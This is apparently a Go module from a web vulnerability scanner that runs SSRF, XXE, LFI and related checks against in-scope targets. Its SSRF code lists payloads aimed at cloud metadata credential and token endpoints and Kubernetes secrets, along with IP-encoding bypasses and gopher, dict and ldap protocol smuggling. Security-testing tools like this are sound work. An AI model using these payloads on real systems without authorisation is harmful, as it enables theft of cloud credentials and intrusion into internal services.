package modules

import (
	"context"
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"sync"

	"github.com/akha-security/akca/engine/internal/httpclient"
	"github.com/akha-security/akca/engine/internal/payloadgen"
	"github.com/akha-security/akca/engine/internal/verification"
)

func (r *Runner) RunGroupB(ctx context.Context, targets []ScanTarget) ([]ModuleFinding, error) {
	_ = r.emit("vuln_modules_b_started", "SSRF, LFI & XXE scanning started", map[string]interface{}{
		"scan_id": r.scanID, "targets": len(targets),
	})

	workers := r.cfg.PerHostConcurrency
	if workers <= 0 {
		workers = 8
	}
	if workers > len(targets) {
		workers = len(targets)
	}

	var mu sync.Mutex
	var findings []ModuleFinding

	targetCh := make(chan ScanTarget, moduleQueueCapacity(workers, len(targets)))

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() {
				if rec := recover(); rec != nil {
					_ = r.emit("log", fmt.Sprintf("RunGroupB worker recovered from panic: %v", rec), map[string]interface{}{"scan_id": r.scanID})
				}
			}()
			for target := range targetCh {
				if ctx.Err() != nil {
					return
				}
				if r.budgetExhausted.Load() {
					continue
				}
				if !r.scope.IsInScope(target.EndpointURL) {
					continue
				}
				func() {
					defer func() {
						if rec := recover(); rec != nil {
							_ = r.emit("log", fmt.Sprintf("RunGroupB target %s recovered from panic: %v", target.EndpointURL, rec), map[string]interface{}{"scan_id": r.scanID})
						}
					}()
					var localFindings []ModuleFinding
					if r.cfg.AllowsModule("ssrf") {
						localFindings = append(localFindings, r.runSSRF(ctx, target)...)
					}
					if r.cfg.AllowsModule("xxe") {
						localFindings = append(localFindings, r.runXXE(ctx, target)...)
					}
					if r.cfg.AllowsModule("lfi") {
						localFindings = append(localFindings, r.runLFI(ctx, target)...)
					}
					if r.cfg.AllowsModule("file_upload") {
						localFindings = append(localFindings, r.runFileUpload(ctx, target)...)
					}
					if r.cfg.AllowsModule("idor") {
						localFindings = append(localFindings, r.runIDOR(ctx, target)...)
					}
					if r.cfg.AllowsModule("bfla") {
						localFindings = append(localFindings, r.runBFLA(ctx, target)...)
					}
					if r.cfg.AllowsModule("open_redirect") {
						localFindings = append(localFindings, r.runOpenRedirect(ctx, target)...)
					}
					if r.cfg.AllowsModule("host_header") {
						localFindings = append(localFindings, r.runHostHeader(ctx, target)...)
					}
					if r.cfg.AllowsModule("second_order") {
						localFindings = append(localFindings, r.runSecondOrder(ctx, target)...)
					}

					if len(localFindings) > 0 {
						mu.Lock()
						findings = append(findings, localFindings...)
						mu.Unlock()
					}
				}()
			}
		}()
	}
	feedModuleTargets(ctx, targetCh, targets)
	wg.Wait()

	_ = r.emit("vuln_modules_b_finished", "SSRF, LFI & XXE scanning finished", map[string]interface{}{
		"scan_id": r.scanID, "findings": len(findings),
	})
	return findings, nil
}

func (r *Runner) RunGroupBFromDB(ctx context.Context, limit int) ([]ModuleFinding, error) {
	targets, err := r.LoadTargetsWithEndpointsFromDB(limit)
	if err != nil {
		return nil, err
	}
	return r.RunGroupB(ctx, targets)
}

func (r *Runner) runSSRF(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("ssrf", target); !ok {
		r.emitSkip("ssrf", target, reason)
		return nil
	}
	strongCandidate, _ := ssrfReady(target)
	oastURL := ""
	if r.cfg.EnableOAST {
		if r.oast != nil {
			oastURL = strings.TrimSpace(r.oastURL(ctx, "ssrf-"+target.Parameter, target, "ssrf"))
			if oastURL == "" {
				r.emitOnce("ssrf_oast_url_unavailable", "coverage_gap", "SSRF OAST URL generation failed", map[string]interface{}{
					"module": "ssrf", "endpoint": target.EndpointURL, "parameter": target.Parameter,
				})
			}
		} else {
			r.emitOnce("ssrf_oast_listener_unavailable", "coverage_gap", "SSRF blind OAST coverage unavailable because listener is not running", map[string]interface{}{
				"module": "ssrf", "endpoint": target.EndpointURL, "parameter": target.Parameter,
			})
		}
	}
	_ = r.emit("ssrf_probe_started", "SSRF probe coverage started", map[string]interface{}{
		"scan_id": r.scanID, "endpoint": target.EndpointURL, "parameter": target.Parameter,
		"mode":         map[bool]string{true: "direct_and_oast", false: "oast_only"}[strongCandidate],
		"oast_enabled": r.cfg.EnableOAST, "oast_registered": oastURL != "",
	})
	oastSent := 0
	if oastURL != "" {
		oastSent = r.sendSSRFOASTProbes(ctx, target, oastURL)
	}
	if !strongCandidate {
		// Always attempt OAST probes for weak candidates when available.
		if oastSent > 0 {
			_ = r.emit("ssrf_oast_probe_coverage", "SSRF OAST probe coverage recorded", map[string]interface{}{
				"scan_id": r.scanID, "endpoint": target.EndpointURL, "parameter": target.Parameter,
				"probes_sent": oastSent, "candidate_strength": "weak",
			})
		}
		// Also try a lightweight direct response-based check against cloud
		// metadata endpoints. This ensures weak candidates are not entirely
		// dependent on OAST for detection.
		if directFindings := r.ssrfDirectResponseCheck(ctx, target, oastURL); len(directFindings) > 0 {
			return directFindings
		}
		if oastURL == "" {
			r.emitSkip("ssrf", target, "weak SSRF candidate: OAST unavailable and direct metadata check negative")
		}
		return nil
	}
	baseline, ok, baselineReason := r.stableNativeBaselineForModule(ctx, "ssrf", target)
	if !ok {
		r.emitSkip("ssrf", target, baselineReason)
		return nil
	}
	type directObservation struct {
		payload payloadgen.Payload
		rr      httpclient.RequestResponse
	}
	observations := map[string][]directObservation{}
	var out []ModuleFinding
	for _, p := range r.modulePayloads(target, "ssrf", oastURL) {
		if p.ExpectedSignal == "blind_oast" {
			continue
		}
		rr, err := r.probeSSRF(ctx, target, p)
		if err != nil {
			continue
		}
		if runtimeFinding, handled := r.runtimeSinkProof(ctx, "ssrf", target, p, baseline, rr); handled {
			if runtimeFinding != nil {
				r.recordFinding(ctx, &out, runtimeFinding, "ssrf", runtimeFinding.Evidence.Signal)
				return out
			}
			continue
		}
		signal := normalizedSSRFSignal(p)
		if !ssrfSignalConfirmed(p, baseline.Response, rr.Response, signal) {
			continue
		}
		observations[signal] = append(observations[signal], directObservation{payload: p, rr: rr})
	}

	for signal, proofs := range observations {
		if len(proofs) >= 2 {
			// Standard two-probe confirmation
			first := proofs[0]
			f := r.verifyAndBuild(ctx, "ssrf", target, first.payload, baseline, first.rr, signal, false, false, "", "")
			if f != nil {
				f.Description += " Confirmed by two independent provider-specific direct-response probes."
				f.Evidence.Verification.UpgradeReasons = append(f.Evidence.Verification.UpgradeReasons,
					"two_provider_specific_probes")
			}
			if r.recordFinding(ctx, &out, f, "ssrf", signal) {
				return out
			}
		} else if len(proofs) == 1 && ssrfHighConfidenceMetadata(proofs[0].rr.Response.Body) {
			// Single probe with very high-confidence cloud metadata fingerprint.
			// Accept as HighConfidence (not Confirmed) since only one probe matched.
			first := proofs[0]
			f := r.verifyAndBuild(ctx, "ssrf", target, first.payload, baseline, first.rr, signal, false, false, "", "")
			if f != nil {
				f.Description += " Cloud metadata fingerprint detected in single-probe response body."
				if f.Evidence.Verification.Confidence == verification.Confirmed {
					f.Evidence.Verification.Confidence = verification.HighConfidence
					if f.Evidence.Verification.Score >= 0.9 {
						f.Evidence.Verification.Score = 0.85
					}
				}
			}
			if r.recordFinding(ctx, &out, f, "ssrf", signal) {
				return out
			}
		} else if len(proofs) == 1 {
			// Single probe without high-confidence metadata: re-probe to verify
			// the signal is reproducible before accepting.
			first := proofs[0]
			reprobe, repErr := r.probeSSRF(ctx, target, first.payload)
			if repErr == nil && ssrfSignalConfirmed(first.payload, baseline.Response, reprobe.Response, signal) {
				f := r.verifyAndBuild(ctx, "ssrf", target, first.payload, baseline, reprobe, signal, false, false, "", "")
				if f != nil {
					f.Description += " Verified by single-probe re-confirmation."
					if f.Evidence.Verification.Confidence == verification.Confirmed {
						f.Evidence.Verification.Confidence = verification.HighConfidence
						if f.Evidence.Verification.Score >= 0.9 {
							f.Evidence.Verification.Score = 0.80
						}
					}
				}
				if r.recordFinding(ctx, &out, f, "ssrf", signal) {
					return out
				}
			}
		}
	}
	if oastURL != "" {
		_ = r.emit("ssrf_oast_probe_coverage", "SSRF OAST probe coverage recorded", map[string]interface{}{
			"scan_id": r.scanID, "endpoint": target.EndpointURL, "parameter": target.Parameter,
			"probes_sent": oastSent, "candidate_strength": "strong",
		})
	}
	return out
}

func (r *Runner) sendSSRFOASTProbes(ctx context.Context, target ScanTarget, oastURL string) int {
	sent := 0
	for _, p := range r.modulePayloads(target, "ssrf", oastURL) {
		if p.ExpectedSignal != "blind_oast" {
			continue
		}
		if r.sendOASTProbe(ctx, target, strings.TrimSpace(p.Value)) {
			sent++
		}
	}
	return sent
}

func ssrfSignal(body, baseline, signal string) bool {
	p := payloadgen.Payload{ExpectedSignal: signal}
	return ssrfSignalConfirmed(p,
		httpclient.ResponseRecord{Body: baseline},
		httpclient.ResponseRecord{Body: body},
		signal,
	)
}

func normalizedSSRFSignal(p payloadgen.Payload) string {
	signal := strings.TrimSpace(p.ExpectedSignal)
	if signal != "" && signal != "cloud_metadata" {
		return signal
	}
	value := strings.ToLower(p.Value)
	switch {
	case strings.Contains(value, "metadata.google"):
		return "gcp_metadata"
	case strings.Contains(value, "metadata/instance") || strings.Contains(value, "identity/oauth2"):
		return "azure_metadata"
	case strings.Contains(value, "100.100.100.200"):
		return "alibaba_metadata"
	case strings.Contains(value, "metadata/v1.json") || strings.Contains(value, "metadata/v1/"):
		return "do_metadata"
	case strings.Contains(value, "192.0.0.192"):
		return "oracle_metadata"
	case strings.Contains(value, "kubernetes") || strings.Contains(value, "serviceaccount"):
		return "k8s_metadata"
	default:
		return "aws_metadata"
	}
}

// ssrfHighConfidenceMetadata returns true when the response body contains
// cloud provider metadata fingerprints that cannot occur by accident. These
// patterns are specific enough that a single matching probe is sufficient
// to report at HighConfidence level.
func ssrfHighConfidenceMetadata(body string) bool {
	lower := strings.ToLower(body)
	for _, marker := range []string{
		// AWS EC2 instance metadata & IAM
		"ami-id", "instance-id", "iam/security-credentials", "security-credentials",
		"meta-data/hostname", "meta-data/local-ipv4", "accesskeyid", "secretaccesskey",
		// GCP metadata
		"computemetadata", "project/project-id",
		"instance/service-accounts", "service-accounts/default/token",
		// Azure IMDS & Managed Identity
		"microsoft.compute", "azureenvironment",
		"subscriptionid", "identity/oauth2/token",
		// DigitalOcean, Alibaba, Oracle Cloud
		"droplet_id", "droplet_v2", "alibaba-cloud", "compute_metadata",
		// Docker / Consul / Kubernetes
		"docker engine", "k8s", "consul", "kubernetes.io/serviceaccount",
		"token/default-token", "ca.crt",
	} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func (r *Runner) probeSSRF(ctx context.Context, target ScanTarget, p payloadgen.Payload) (httpclient.RequestResponse, error) {
	headers := map[string]string{}
	switch normalizedSSRFSignal(p) {
	case "gcp_metadata", "gcp_token":
		headers["Metadata-Flavor"] = "Google"
	case "azure_metadata", "azure_token":
		headers["Metadata"] = "true"
	}
	if p.Variant == "aws_imds_v2_token" {
		headers["X-aws-ec2-metadata-token-ttl-seconds"] = "21600"
	}
	if len(headers) > 0 {
		return r.probeWithHeadersForModule(ctx, "ssrf", target, strings.TrimSpace(p.Value), headers)
	}
	return r.probeForModule(ctx, "ssrf", target, strings.TrimSpace(p.Value))
}

// ssrfDirectResponseCheck performs a lightweight direct response-based SSRF
// check for weak candidates. It sends cloud metadata payloads and checks
// for known metadata fingerprints in the response body, without requiring
// OAST callbacks.
func (r *Runner) ssrfDirectResponseCheck(ctx context.Context, target ScanTarget, oastURL string) []ModuleFinding {
	baseline, ok, reason := r.stableNativeBaselineForModule(ctx, "ssrf", target)
	if !ok {
		r.emitSkip("ssrf", target, "weak candidate direct check: "+reason)
		return nil
	}
	metadataPayloads := []payloadgen.Payload{
		{VulnClass: "ssrf", Value: "http://169.254.169.254/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "aws_imds_v1"},
		{VulnClass: "ssrf", Value: "http://169.254.169.254/latest/api/token", ExpectedSignal: "aws_metadata", Variant: "aws_imds_v2_token"},
		{VulnClass: "ssrf", Value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ExpectedSignal: "aws_iam_role", Variant: "aws_iam_security_credentials"},
		{VulnClass: "ssrf", Value: "http://metadata.google.internal/computeMetadata/v1/", ExpectedSignal: "gcp_metadata", Variant: "gcp_metadata"},
		{VulnClass: "ssrf", Value: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", ExpectedSignal: "gcp_token", Variant: "gcp_service_account_token"},
		{VulnClass: "ssrf", Value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ExpectedSignal: "azure_metadata", Variant: "azure_imds"},
		{VulnClass: "ssrf", Value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", ExpectedSignal: "azure_token", Variant: "azure_identity_token"},
		{VulnClass: "ssrf", Value: "http://127.0.0.1:2375/version", ExpectedSignal: "docker_api", Variant: "docker_daemon"},
		{VulnClass: "ssrf", Value: "http://127.0.0.1:8500/v1/agent/self", ExpectedSignal: "consul_api", Variant: "consul_service"},
		{VulnClass: "ssrf", Value: "http://127.0.0.1/", ExpectedSignal: "internal_ip", Variant: "loopback_ip"},
		{VulnClass: "ssrf", Value: "http://localhost/", ExpectedSignal: "internal_ip", Variant: "loopback_localhost"},
		// IP representation bypass variants (127.0.0.1 and 169.254.169.254)
		{VulnClass: "ssrf", Value: "http://2130706433/", ExpectedSignal: "internal_ip", Variant: "decimal_127_0_0_1"},
		{VulnClass: "ssrf", Value: "http://2852039166/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "decimal_imds_ip"},
		{VulnClass: "ssrf", Value: "http://0x7f000001/", ExpectedSignal: "internal_ip", Variant: "hex_ip"},
		{VulnClass: "ssrf", Value: "http://0xa9fea9fe/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "hex_imds_ip"},
		{VulnClass: "ssrf", Value: "http://0177.0.0.1/", ExpectedSignal: "internal_ip", Variant: "octal_ip"},
		{VulnClass: "ssrf", Value: "http://0251.0372.0251.0372/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "octal_imds_ip"},
		{VulnClass: "ssrf", Value: "http://[::1]/", ExpectedSignal: "internal_ip", Variant: "ipv6_loopback"},
		{VulnClass: "ssrf", Value: "http://127.1/", ExpectedSignal: "internal_ip", Variant: "short_loopback"},
		{VulnClass: "ssrf", Value: "http://[0:0:0:0:0:ffff:127.0.0.1]/", ExpectedSignal: "internal_ip", Variant: "ipv6_mapped_v4"},
		{VulnClass: "ssrf", Value: "http://127.0.0.1.nip.io/", ExpectedSignal: "internal_ip", Variant: "dns_rebind_nip_io"},
		{VulnClass: "ssrf", Value: "http://169.254.169.254.nip.io/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "dns_rebind_imds_nip_io"},
		// Additional cloud providers & orchestrators
		{VulnClass: "ssrf", Value: "http://100.100.100.200/latest/meta-data/", ExpectedSignal: "alibaba_metadata", Variant: "alibaba_metadata"},
		{VulnClass: "ssrf", Value: "http://169.254.169.254/metadata/v1.json", ExpectedSignal: "do_metadata", Variant: "digitalocean_metadata"},
		{VulnClass: "ssrf", Value: "http://192.0.0.192/latest/meta-data/", ExpectedSignal: "oracle_metadata", Variant: "oracle_cloud_metadata"},
		{VulnClass: "ssrf", Value: "https://kubernetes.default.svc/api/v1/namespaces/default/secrets", ExpectedSignal: "k8s_secrets", Variant: "k8s_internal_api"},
		{VulnClass: "ssrf", Value: "file:///var/run/secrets/kubernetes.io/serviceaccount/token", ExpectedSignal: "k8s_secrets", Variant: "k8s_service_account_token"},
		// Protocol smuggling variants
		{VulnClass: "ssrf", Value: "gopher://127.0.0.1:6379/_PING%0d%0a", ExpectedSignal: "protocol_smuggling", Variant: "gopher_redis"},
		{VulnClass: "ssrf", Value: "dict://127.0.0.1:11211/stat", ExpectedSignal: "protocol_smuggling", Variant: "dict_memcached"},
		{VulnClass: "ssrf", Value: "ldap://127.0.0.1:389/o=base", ExpectedSignal: "protocol_smuggling", Variant: "ldap_smuggling"},
	}
	var out []ModuleFinding
	for _, p := range metadataPayloads {
		if ctx.Err() != nil {
			break
		}
		rr, err := r.probeSSRF(ctx, target, p)
		if err != nil {
			continue
		}
		if ssrfHighConfidenceMetadata(rr.Response.Body) || ssrfSignalConfirmed(p, baseline.Response, rr.Response, p.ExpectedSignal) {
			signal := normalizedSSRFSignal(p)
			f := r.verifyAndBuild(ctx, "ssrf", target, p, baseline, rr, signal, false, false, "", "")
			if f != nil {
				lowerBody := strings.ToLower(rr.Response.Body)
				if strings.Contains(lowerBody, "accesskeyid") || strings.Contains(lowerBody, "secretaccesskey") ||
					strings.Contains(lowerBody, "access_token") || strings.Contains(lowerBody, "security-credentials") {
					f.Title = "Critical SSRF — Cloud IAM / Token Exposure (" + p.Variant + ")"
					f.Severity = "critical"
					f.Description = "Server-Side Request Forgery successfully retrieved cloud instance credentials / IAM tokens from internal metadata."
				} else {
					f.Description += " Direct response SSRF signal detected on target."
				}
				if f.Evidence.Verification.Confidence == verification.Confirmed {
					f.Evidence.Verification.Confidence = verification.HighConfidence
					if f.Evidence.Verification.Score >= 0.9 {
						f.Evidence.Verification.Score = 0.85
					}
				}
			}
			if r.recordFinding(ctx, &out, f, "ssrf", signal) {
				return out
			}
		}
	}
	return out
}

func (r *Runner) stableNativeBaseline(ctx context.Context, target ScanTarget) (httpclient.RequestResponse, bool, string) {
	return r.stableNativeBaselineForModule(ctx, "", target)
}

// stableNativeBaselineForModule sends the same request 3 times and verifies that
// the responses are nearly identical (same status code, body diff ratio < 0.35).
// When the baseline is unstable the third return value describes why, so the
// caller can emit a diagnostic skip event instead of silently dropping the target.
func (r *Runner) stableNativeBaselineForModule(ctx context.Context, module string, target ScanTarget) (httpclient.RequestResponse, bool, string) {
	value := nativeTargetValue(target)
	var first httpclient.RequestResponse
	for i := 0; i < 3; i++ {
		rr, err := r.probeForModule(ctx, module, target, value)
		if err != nil {
			if i == 0 {
				first, err = r.cachedEmptyProbe(ctx, target)
				if err != nil {
					return httpclient.RequestResponse{}, false, fmt.Sprintf("baseline probe failed on attempt %d: %v", i+1, err)
				}
			} else {
				// Don't fail baseline on subsequent retry network noise if first attempt succeeded
				break
			}
		}
		if i == 0 {
			first = rr
			continue
		}
		if rr.Response.StatusCode != first.Response.StatusCode {
			return httpclient.RequestResponse{}, false, fmt.Sprintf(
				"unstable baseline: status code changed from %d to %d on attempt %d",
				first.Response.StatusCode, rr.Response.StatusCode, i+1)
		}
		ratio := bodyDiffRatio(normalizeVolatileFields(first.Response.Body), normalizeVolatileFields(rr.Response.Body))
		if ratio > 0.85 {
			return httpclient.RequestResponse{}, false, fmt.Sprintf(
				"unstable baseline: body diff ratio %.4f exceeds threshold 0.85 on attempt %d",
				ratio, i+1)
		}
	}
	return first, true, ""
}

func nativeTargetValue(target ScanTarget) string {
	u, err := url.Parse(target.EndpointURL)
	if err == nil && target.Parameter != "" {
		if value, exists := u.Query()[target.Parameter]; exists && len(value) > 0 {
			return value[0]
		}
	}
	if target.BodyTemplate != "" && target.Parameter != "" {
		location := strings.ToLower(strings.TrimSpace(target.Location))
		if location == "form" {
			if values, err := url.ParseQuery(target.BodyTemplate); err == nil {
				return values.Get(target.Parameter)
			}
		}
		if location == "json" || strings.Contains(strings.ToLower(target.Profile.ContentType), "json") {
			var object map[string]any
			if json.Unmarshal([]byte(target.BodyTemplate), &object) == nil {
				if value, exists := object[target.Parameter]; exists {
					return fmt.Sprint(value)
				}
			}
		}
	}
	return ""
}
